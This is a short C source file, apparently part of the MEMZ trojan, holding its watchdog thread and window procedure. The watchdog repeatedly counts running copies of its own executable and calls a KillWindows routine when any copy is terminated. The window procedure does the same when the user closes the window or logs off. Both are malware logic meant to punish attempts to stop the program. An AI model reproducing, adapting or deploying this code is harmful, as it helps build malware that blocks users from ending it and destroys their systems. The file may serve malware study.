#include "MEMZ.h"

// WatchDogThread
DWORD WINAPI WatchDogThread(LPVOID lpParameter) {
	int oProc = 0;

	wchar_t *pifn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 512);
	GetProcessImageFileName(GetCurrentProcess(), pifn, 512);

	Sleep(0x7ff);

	for (;;) {
		HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		PROCESSENTRY32 Proc;
		Proc.dwSize = sizeof(PROCESSENTRY32);

		Process32First(Snapshot, &Proc);

		int nProc = 0;
		while (Process32Next(Snapshot, &Proc)) {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Proc.th32ProcessID);
			wchar_t *pifn2 = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 512);
			GetProcessImageFileName(hProc, pifn2, 512);

			if (!lstrcmp(pifn, pifn2)) {
				nProc++;
			}

			CloseHandle(hProc);
			LocalFree(pifn2);
		}

		CloseHandle(Snapshot);

		if (nProc < oProc) {
			KillWindows();
		}

		oProc = nProc;

		Sleep(0x7f);
	}
}

// WindowProc for WatchDogThread
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	if (uMsg == WM_CLOSE || uMsg == WM_ENDSESSION) {
		KillWindows();
		return 0;
	}

	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}